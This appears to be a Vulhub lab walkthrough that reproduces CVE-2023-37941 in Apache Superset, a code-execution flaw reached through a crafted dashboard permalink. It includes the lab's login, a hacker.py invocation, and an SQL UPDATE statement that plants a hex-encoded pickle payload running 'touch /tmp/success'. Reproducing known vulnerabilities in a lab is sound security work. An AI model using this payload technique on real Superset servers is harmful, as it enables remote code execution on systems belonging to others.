# Superset CVE-2023-37941

Reference:
https://github.com/vulhub/vulhub/blob/master/superset/CVE-2023-37941/README.zh-cn.md

After the service starts, visit `http://your-ip:8088` to access Superset.

Credentials:

`admin/vulhub`

Create a dashboard and copy a share link like these:

http://ip:8088/superset/dashboard/p/O9AYQDewnv2/


Because this scene uses a PostgreSQL connection, use this database URI when creating the database:

```
postgresql+psycopg2://superset:superset@postgres:5432/superset
```

Then run this Python command:

```
python hacker.py -c "touch /tmp/success" -d postgres
```

It outputs an update statement.

```
update key_value set value='\x63706f7369780a73797374656d0a70300a2856746f756368202f746d702f737563636573730a70310a7470320a5270330a2e' where resource='dashboard_permalink';
```

Execute that statement in SQL Lab.

Finally, visit the copied share link to complete the attack.

Use this command to check whether the attack succeeded:

```
docker compose exec web ls /tmp
```
